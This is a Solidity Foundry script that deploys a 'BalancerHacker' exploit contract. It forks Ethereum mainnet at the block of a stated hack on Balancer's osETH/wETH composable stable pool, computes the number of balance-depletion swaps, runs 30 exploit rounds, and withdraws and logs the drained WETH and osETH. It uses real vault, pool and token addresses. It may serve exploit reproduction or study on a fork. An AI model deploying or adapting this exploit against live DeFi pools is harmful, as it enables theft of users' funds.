// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {BalancerHacker, IComposableStablePool} from "../src/Balancer/Hacker.sol";

  import {
      IVault,
      IAsset
  } from "../src/interfaces/IVault.sol";
  import {
      IERC20
  } from "../src/interfaces/IERC20.sol";

/// @notice Minimal deployment script for the exploit planner contract.
/// @dev Run with:
///      forge script script/DeployBalancerHacker.s.sol:DeployBalancerHacker --broadcast --rpc-url <RPC_URL>
contract DeployBalancerHacker is Script {
    uint256 public HACK_BLOCK = 23717396; // the block number of the osETH_wETH_BPT pool hack
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant OSETH =
        0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    uint256 constant MAX_BALANCE_FOR_EXPLOIT = 51_268;

    function run() external returns (BalancerHacker deployed) {
        vm.createSelectFork("https://rpc.mevblocker.io", HACK_BLOCK);
        IVault vault = IVault(
            payable(0xBA12222222228d8Ba445958a75a0704d566BF2C8)
        );
        bytes32 poolId = IComposableStablePool(
            0xDACf5Fa19b1f720111609043ac67A9818262850c
        ).getPoolId();
        (, uint256[] memory balances, ) = vault.getPoolTokens(poolId);

        uint256 wethDepletionSwaps = getNoOfDepletionSwaps(balances[0]);
        uint256 osethDepletionSwaps = getNoOfDepletionSwaps(balances[2]);

        uint256 maxDepletionSwaps = wethDepletionSwaps + osethDepletionSwaps;

        deployed = new BalancerHacker(maxDepletionSwaps, 30); // 30 exploit rounds; it can be more.

        // Withdraw any Internal Balance credited to this deployer contract (if any),
        // then log external balances.
        _withdrawAndLog(vault);
    }

    function _withdrawAndLog(IVault vault) private {
        address[2] memory tokenAddrs = [WETH, OSETH];

        IERC20[] memory tokens = new IERC20[](2);
        for (uint256 i = 0; i < 2; ++i) {
            tokens[i] = IERC20(tokenAddrs[i]);
        }

        uint256[] memory internalBalances = vault.getInternalBalance(
            address(this),
            tokens
        );

        uint256 opsCount = 0;
        for (uint256 i = 0; i < 2; ++i) {
            if (internalBalances[i] > 0) opsCount++;
        }

        if (opsCount != 0) {
            IVault.UserBalanceOp[] memory ops = new IVault.UserBalanceOp[](
                opsCount
            );
            uint256 j = 0;

            for (uint256 i = 0; i < 2; ++i) {
                uint256 amount = internalBalances[i];
                if (amount == 0) continue;

                ops[j++] = IVault.UserBalanceOp({
                    kind: IVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(tokenAddrs[i]),
                    amount: amount,
                    sender: address(this),
                    recipient: payable(address(this))
                });
            }

            vault.manageUserBalance(ops);
        }

        console.log("deployer WETH", tokens[0].balanceOf(address(this)));
        console.log("deployer osETH", tokens[1].balanceOf(address(this)));
    }

    function getNoOfDepletionSwaps(
        uint256 balance
    ) private view returns (uint256 n) {
        require(balance > MAX_BALANCE_FOR_EXPLOIT, "Balance must be greater than MAX_BALANCE_FOR_EXPLOIT");

        while (balance > MAX_BALANCE_FOR_EXPLOIT) {
            n++;
            balance = balance / 100; // shift 2 decimal places to the right
        }
        return n;
    }
}
